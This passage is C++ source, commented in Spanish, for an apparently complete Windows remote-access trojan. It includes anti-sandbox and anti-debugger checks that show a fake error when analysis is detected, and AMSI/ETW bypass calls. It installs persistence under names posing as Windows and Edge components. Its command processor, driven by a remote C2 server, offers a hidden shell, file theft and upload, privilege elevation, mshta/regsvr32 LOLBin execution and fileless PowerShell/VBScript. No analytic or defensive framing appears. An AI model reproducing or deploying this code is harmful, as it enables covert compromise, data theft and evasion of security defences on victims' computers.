        return mem.ullTotalPhys < 4LL * 1024 * 1024 * 1024;  // <4GB = sandbox
    }
    
    bool CheckCPUCores() {
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        return sysInfo.dwNumberOfProcessors < 2;  // <2 cores = sandbox
    }
    
    bool CheckDiskSize() {
        ULARGE_INTEGER free, total;
        GetDiskFreeSpaceExA("C:\\", &free, &total, NULL);
        return total.QuadPart < 60LL * 1024 * 1024 * 1024;  // <60GB = sandbox
    }
    
    bool CheckRunningProcesses() {
        const wchar_t* sandboxProcs[] = {
            L"vboxservice.exe", L"vboxtray.exe", L"vmtoolsd.exe",
            L"vmwaretray.exe", L"vmwareuser.exe", L"xenservice.exe",
            L"procmon.exe", L"wireshark.exe", L"dumpcap.exe"
        };
        
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    for (const auto& proc : sandboxProcs) {
                        if (_wcsicmp(pe.szExeFile, proc) == 0) {
                            CloseHandle(hSnap);
                            return true;
                        }
                    }
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        return false;
    }
    
    bool CheckUsername() {
        wchar_t username[256];
        DWORD size = sizeof(username) / sizeof(wchar_t);
        GetUserNameW(username, &size);
        
        const wchar_t* sandboxUsers[] = {
            L"admin", L"administrator", L"user", L"test",
            L"virus", L"malware", L"sandbox", L"vmware"
        };
        
        for (const auto& user : sandboxUsers) {
            if (wcsstr(username, user)) return true;
        }
        return false;
    }
    
    bool CheckComputerName() {
        wchar_t compname[256];
        DWORD size = sizeof(compname) / sizeof(wchar_t);
        GetComputerNameW(compname, &size);
        
        const wchar_t* sandboxNames[] = {
            L"SANDBOX", L"VIRUS", L"MALWARE", L"VMWARE",
            L"VIRTUAL", L"QEMU", L"BOCHS", L"PC"
        };
        
        for (const auto& name : sandboxNames) {
            if (wcsstr(compname, name)) return true;
        }
        return false;
    }
    
    bool CheckUptime() {
        return GetTickCount64() < 10 * 60 * 1000;  // <10 min = sandbox
    }
    
    bool CheckMouseMovement() {
        POINT pos1, pos2;
        GetCursorPos(&pos1);
        Sleep(1000);
        GetCursorPos(&pos2);
        
        return (pos1.x == pos2.x && pos1.y == pos2.y);  // Sin movimiento = sandbox
    }
    
    bool CheckDebugger() {
        // PEB BeingDebugged
        PPEB peb = (PPEB)__readgsqword(0x60);
        if (peb->BeingDebugged) return true;
        
        // NtQueryInformationProcess
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        pNtQueryInformationProcess NtQueryInformationProcess =
            (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
        
        if (NtQueryInformationProcess) {
            ULONG debugPort = 0;
            NtQueryInformationProcess(GetCurrentProcess(), 0x7, &debugPort, sizeof(debugPort), NULL);
            if (debugPort != 0) return true;
        }
        
        return false;
    }
    
    bool CheckHardwareBreakpoints() {
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        GetThreadContext(GetCurrentThread(), &ctx);
        
        return (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3);
    }
    
    bool CheckHypervisor() {
        int cpuInfo[4] = { 0 };
        __cpuid(cpuInfo, 1);
        return (cpuInfo[2] & (1 << 31)) != 0;  // Hypervisor presente
    }
};

// ============================================================================
// SISTEMA DE REPORTE DE ERRORES Y LOGGING
// ============================================================================
class Logger {
private:
    std::ofstream logFile;
    std::mutex logMutex;
    bool enabled;
    
public:
    Logger() : enabled(false) {
        // Solo habilitar en modo debug
#ifdef _DEBUG
        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        
        wchar_t logPath[MAX_PATH];
        swprintf(logPath, MAX_PATH, L"%s\\debug_%08X.log", tempPath, GetTickCount());
        
        logFile.open(logPath, std::ios::out | std::ios::app);
        enabled = logFile.is_open();
#endif
    }
    
    ~Logger() {
        if (logFile.is_open()) logFile.close();
    }
    
    void Log(const std::string& message) {
        if (!enabled) return;
        
        std::lock_guard<std::mutex> lock(logMutex);
        
        SYSTEMTIME st;
        GetLocalTime(&st);
        
        logFile << "[" << st.wYear << "-" << st.wMonth << "-" << st.wDay
            << " " << st.wHour << ":" << st.wMinute << ":" << st.wSecond
            << "] " << message << std::endl;
        logFile.flush();
    }
    
    void LogError(const std::string& function, DWORD error) {
        if (!enabled) return;
        
        char buffer[256];
        sprintf(buffer, "ERROR en %s: %u", function.c_str(), error);
        Log(buffer);
    }
};

// ============================================================================
// PROCESADOR DE COMANDOS CON SOPORTE DE PLUGINS
// ============================================================================
class CommandProcessor {
private:
    SecureC2* c2;
    PluginManager plugins;
    LOLBinExecutor lolbin;
    FilelessExecutor fileless;
    AntiSandbox antiSandbox;
    Logger logger;
    bool isElevated;
    
public:
    CommandProcessor(SecureC2* c2Instance) : c2(c2Instance), isElevated(false) {
        logger.Log("CommandProcessor inicializado");
    }
    
    std::string Process(const std::string& cmd) {
        logger.Log("Comando recibido: " + cmd);
        
        try {
            if (cmd == "INFO") {
                return GetSystemInfoJSON();
            }
            else if (cmd == "INFO_FULL") {
                return GetSystemInfoFull();
            }
            else if (cmd == "PROCESSES") {
                return GetProcessList();
            }
            else if (cmd == "ELEVATE") {
                return ElevatePrivileges();
            }
            else if (cmd.substr(0, 5) == "SHELL") {
                if (cmd.length() > 6) {
                    return ExecuteCommand(cmd.substr(6));
                }
                return "[-] Uso: SHELL <comando>\n";
            }
            else if (cmd.substr(0, 4) == "EXEC") {
                if (cmd.length() > 5) {
                    return ExecuteProgram(cmd.substr(5));
                }
                return "[-] Uso: EXEC <programa>\n";
            }
            else if (cmd.substr(0, 4) == "KILL") {
                if (cmd.length() > 5) {
                    DWORD pid = atoi(cmd.substr(5).c_str());
                    return KillProcess(pid);
                }
                return "[-] Uso: KILL <PID>\n";
            }
            else if (cmd.substr(0, 3) == "DIR") {
                if (cmd.length() > 4) {
                    return ListDirectory(cmd.substr(4));
                }
                return ListDirectory("C:\\");
            }
            else if (cmd.substr(0, 8) == "DOWNLOAD") {
                if (cmd.length() > 9) {
                    return DownloadFile(cmd.substr(9));
                }
                return "[-] Uso: DOWNLOAD <archivo>\n";
            }
            else if (cmd.substr(0, 6) == "UPLOAD") {
                size_t sep = cmd.find('|');
                if (sep != std::string::npos) {
                    std::string path = cmd.substr(7, sep - 7);
                    std::string data = cmd.substr(sep + 1);
                    return UploadFile(path, data);
                }
                return "[-] Uso: UPLOAD <path>|<data>\n";
            }
            else if (cmd == "PERSIST") {
                return InstallPersistence();
            }
            else if (cmd.substr(0, 9) == "LOL_MSHTA") {
                if (cmd.length() > 10) {
                    return lolbin.ExecuteWithMshta(cmd.substr(10)) ?
                        "[+] Ejecutado con mshta\n" : "[-] Falló ejecución\n";
                }
                return "[-] Uso: LOL_MSHTA <script>\n";
            }
            else if (cmd.substr(0, 12) == "LOL_REGSVR32") {
                if (cmd.length() > 13) {
                    return lolbin.ExecuteWithRegsvr32(cmd.substr(13)) ?
                        "[+] Ejecutado con regsvr32\n" : "[-] Falló ejecución\n";
                }
                return "[-] Uso: LOL_REGSVR32 <url>\n";
            }
            else if (cmd == "ANTISANDBOX") {
                return antiSandbox.IsSandboxed() ?
                    "[+] Entorno sandbox detectado\n" : "[-] Entorno limpio\n";
            }
            else if (cmd.substr(0, 6) == "PLUGIN") {
                if (cmd.length() > 7) {
                    // Formato: PLUGIN <nombre> <args>
                    size_t space = cmd.find(' ', 7);
                    if (space != std::string::npos) {
                        std::string pluginName = cmd.substr(7, space - 7);
                        std::string argsStr = cmd.substr(space + 1);
                        
                        std::vector<std::string> args;
                        size_t pos = 0;
                        while ((pos = argsStr.find(' ')) != std::string::npos) {
                            args.push_back(argsStr.substr(0, pos));
                            argsStr.erase(0, pos + 1);
                        }
                        args.push_back(argsStr);
                        
                        return plugins.ExecutePlugin(pluginName, args);
                    }
                }
                return plugins.ListPlugins();
            }
            else if (cmd.substr(0, 8) == "FILELESS") {
                if (cmd.length() > 9) {
                    // FILELESS PS <script>
                    if (cmd.substr(9, 2) == "PS") {
                        return fileless.ExecutePowerShell(cmd.substr(12)) ?
                            "[+] PowerShell ejecutado\n" : "[-] Falló ejecución\n";
                    }
                    else if (cmd.substr(9, 3) == "VBS") {
                        return fileless.ExecuteVBScript(cmd.substr(13)) ?
                            "[+] VBScript ejecutado\n" : "[-] Falló ejecución\n";
                    }
                }
                return "[-] Uso: FILELESS PS|VBS <script>\n";
            }
            else if (cmd == "EXIT") {
                logger.Log("Comando EXIT recibido, terminando");
                ExitProcess(0);
            }
            
            return "[!] Comando desconocido: " + cmd + "\n";
        }
        catch (const std::exception& e) {
            logger.LogError("ProcessCommand", GetLastError());
            return "[-] Error procesando comando: " + std::string(e.what()) + "\n";
        }
    }
    
private:
    std::string GetSystemInfoJSON() {
        char host[256], user[256];
        DWORD size = sizeof(host);
        GetComputerNameA(host, &size);
        size = sizeof(user);
        GetUserNameA(user, &size);
        
        char json[1024];
        snprintf(json, sizeof(json),
            "{\"hostname\":\"%s\",\"username\":\"%s\",\"elevated\":%s,\"sandbox\":%s}",
            host, user,
            isElevated ? "true" : "false",
            antiSandbox.IsSandboxed() ? "true" : "false");
        return std::string(json);
    }
    
    std::string GetSystemInfoFull() {
        std::stringstream ss;
        char buffer[256];
        DWORD size = sizeof(buffer);
        
        if (GetComputerNameA(buffer, &size))
            ss << "Hostname: " << buffer << "\n";
        
        size = sizeof(buffer);
        if (GetUserNameA(buffer, &size))
            ss << "Usuario: " << buffer << "\n";
        
        OSVERSIONINFOEXA osvi = { sizeof(osvi) };
        GetVersionExA((LPOSVERSIONINFOA)&osvi);
        ss << "OS: Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
        ss << " (Build " << osvi.dwBuildNumber << ")\n";
        
        MEMORYSTATUSEX mem = { sizeof(mem) };
        GlobalMemoryStatusEx(&mem);
        ss << "RAM Total: " << mem.ullTotalPhys / 1024 / 1024 / 1024 << " GB\n";
        ss << "RAM Libre: " << mem.ullAvailPhys / 1024 / 1024 / 1024 << " GB\n";
        
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        ss << "Procesadores: " << sysInfo.dwNumberOfProcessors << "\n";
        
        ss << "Sandbox: " << (antiSandbox.IsSandboxed() ? "SÍ" : "NO") << "\n";
        
        return ss.str();
    }
    
    std::string GetProcessList() {
        std::stringstream ss;
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = { sizeof(pe) };
            if (Process32First(snap, &pe)) {
                ss << "PID\tPPID\tNombre\n";
                do {
                    ss << pe.th32ProcessID << "\t" << pe.th32ParentProcessID << "\t" << pe.szExeFile << "\n";
                } while (Process32Next(snap, &pe));
            }
            CloseHandle(snap);
        }
        return ss.str();
    }
    
    std::string ExecuteCommand(const std::string& cmd) {
        std::string result;
        char buffer[BUFFER_SIZE];
        
        HANDLE hReadPipe, hWritePipe;
        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
        
        if (CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
            STARTUPINFOA si = { sizeof(si) };
            si.dwFlags = STARTF_USESTDHANDLES;
            si.hStdOutput = hWritePipe;
            si.hStdError = hWritePipe;
            
            PROCESS_INFORMATION pi = { 0 };
            
            std::string fullCmd = "cmd.exe /c " + cmd;
            
            if (CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, TRUE,
                CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                
                CloseHandle(hWritePipe);
                
                DWORD bytesRead;
                while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                    buffer[bytesRead] = 0;
                    result += buffer;
                }
                
                WaitForSingleObject(pi.hProcess, 30000);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            CloseHandle(hReadPipe);
        }
        
        return result.empty() ? "[+] Comando ejecutado (sin salida)\n" : result;
    }
    
    std::string ExecuteProgram(const std::string& program) {
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        
        BOOL result = CreateProcessA(
            NULL, (LPSTR)program.c_str(), NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi
        );
        
        if (result) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return "[+] Programa ejecutado: " + program + "\n";
        }
        return "[-] Error ejecutando: " + program + " (Error: " + std::to_string(GetLastError()) + ")\n";
    }
    
    std::string KillProcess(DWORD pid) {
        HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (h) {
            TerminateProcess(h, 0);
            CloseHandle(h);
            return "[+] Proceso terminado: " + std::to_string(pid) + "\n";
        }
        return "[-] Error terminando proceso " + std::to_string(pid) + "\n";
    }
    
    std::string ListDirectory(const std::string& path) {
        std::stringstream ss;
        std::string searchPath = path + "\\*.*";
        
        WIN32_FIND_DATAA ffd;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &ffd);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            ss << "Modificado\t\tTipo\tTamaño\tNombre\n";
            do {
                SYSTEMTIME st;
                FileTimeToSystemTime(&ffd.ftLastWriteTime, &st);
                
                char timeStr[64];
                sprintf(timeStr, "%02d/%02d/%04d %02d:%02d",
                    st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute);
                
                if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    ss << timeStr << "\tDIR\t-\t" << ffd.cFileName << "\n";
                }
                else {
                    LARGE_INTEGER size;
                    size.LowPart = ffd.nFileSizeLow;
                    size.HighPart = ffd.nFileSizeHigh;
                    ss << timeStr << "\tFILE\t" << size.QuadPart << "\t" << ffd.cFileName << "\n";
                }
            } while (FindNextFileA(hFind, &ffd) != 0);
            FindClose(hFind);
        }
        else {
            ss << "[-] No se pudo acceder al directorio: " << path << "\n";
        }
        
        return ss.str();
    }
    
    std::string UploadFile(const std::string& path, const std::string& data) {
        std::ofstream file(path, std::ios::binary);
        if (file.is_open()) {
            file.write(data.c_str(), data.length());
            file.close();
            return "[+] Archivo subido: " + path + " (" + std::to_string(data.length()) + " bytes)\n";
        }
        return "[-] Error subiendo archivo a: " + path + "\n";
    }
    
    std::string DownloadFile(const std::string& path) {
        std::ifstream file(path, std::ios::binary);
        if (!file.is_open()) return "[-] Archivo no encontrado: " + path + "\n";
        
        file.seekg(0, std::ios::end);
        size_t size = file.tellg();
        file.seekg(0, std::ios::beg);
        
        std::vector<char> buffer(size);
        file.read(buffer.data(), size);
        file.close();
        
        std::string result = "[+] Archivo: " + path + " (" + std::to_string(size) + " bytes)\n";
        result += std::string(buffer.data(), size);
        
        return result;
    }
    
    std::string InstallPersistence() {
        std::stringstream ss;
        
        // Registro Run
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            
            char modulePath[MAX_PATH];
            GetModuleFileNameA(NULL, modulePath, MAX_PATH);
            
            RegSetValueExA(hKey, "WindowsSecurityHealth", 0, REG_SZ,
                (BYTE*)modulePath, strlen(modulePath) + 1);
            RegCloseKey(hKey);
            ss << "[+] Persistencia en registro\n";
        }
        
        // Tarea programada
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "runas";
        sei.lpFile = "schtasks.exe";
        sei.lpParameters = "/create /tn \"MicrosoftEdgeUpdate\" /tr \"C:\\Windows\\System32\\notepad.exe\" /sc daily /st 09:00 /f";
        sei.nShow = SW_HIDE;
        ShellExecuteExA(&sei);
        ss << "[+] Persistencia en tarea programada\n";
        
        return ss.str();
    }
    
    std::string ElevatePrivileges() {
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"runas";
        
        wchar_t modulePath[MAX_PATH];
        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
        
        sei.lpFile = modulePath;
        sei.lpParameters = L"--elevated";
        sei.nShow = SW_HIDE;
        
        if (ShellExecuteExW(&sei)) {
            isElevated = true;
            return "[+] Elevación solicitada\n";
        }
        
        return "[-] Falló elevación\n";
    }
};

// ============================================================================
// FUNCIÓN PRINCIPAL
// ============================================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow) {
    
    // Inicializar logger
    Logger logger;
    logger.Log("Inicio de ejecución");
    
    // Verificar sandbox
    AntiSandbox antiSandbox;
    if (antiSandbox.IsSandboxed()) {
        // Si es sandbox, comportarse como programa legítimo
        logger.Log("Sandbox detectado, simulando comportamiento normal");
        MessageBoxA(NULL, "Error al iniciar aplicación", "Error", MB_OK);
        return 0;
    }
    
    logger.Log("Entorno limpio, continuando ejecución");
    
    // Mutex para una sola instancia (nombre ofuscado)
    HANDLE hMutex = CreateMutexA(NULL, FALSE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        logger.Log("Mutex ya existe, terminando");
        return 0;
    }
    
    // Ocultar ventana (si no es modo elevado)
    if (strstr(lpCmdLine, "--elevated") == NULL) {
        HWND hWnd = GetConsoleWindow();
        if (hWnd) ShowWindow(hWnd, SW_HIDE);
    }
    
    // Inicializar syscalls para evasión
    logger.Log("Inicializando syscalls");
    SyscallManager syscalls;
    
    // Bypass AMSI/ETW
    logger.Log("Aplicando bypass de AMSI/ETW");
    AMSIBypass amsiBypass(&syscalls);
    amsiBypass.PatchAll();
    
    // Inicializar C2
    logger.Log("Inicializando conexión C2");
    SecureC2 c2;
    
    // Inicializar procesador de comandos
    CommandProcessor cmdProc(&c2);
    
    // Sleep con jitter inicial
    antiSandbox.SleepRandom();
    
    // Loop principal
    logger.Log("Iniciando loop principal");
    while (true) {
        try {
            if (!c2.IsConnected()) {
                logger.Log("Intentando conectar al C2");
                if (c2.Connect()) {
                    logger.Log("Conectado al C2");
                    c2.Send(cmdProc.Process("INFO"));
                }
                else {
                    logger.Log("No se pudo conectar, esperando");
                    antiSandbox.SleepRandom();
                    continue;
                }
            }
            
            std::string cmd = c2.Receive();
            if (!cmd.empty()) {
                logger.Log("Comando recibido: " + cmd);
                std::string response = cmdProc.Process(cmd);
                c2.Send(response);
                logger.Log("Respuesta enviada");
            }
            
            antiSandbox.SleepRandom();
        }
        catch (const std::exception& e) {
            logger.LogError("Main loop", GetLastError());
            // Reintentar después de error
            c2 = SecureC2();  // Reiniciar conexión
            antiSandbox.SleepRandom();
        }
    }
    
    CloseHandle(hMutex);
    return 0;
}
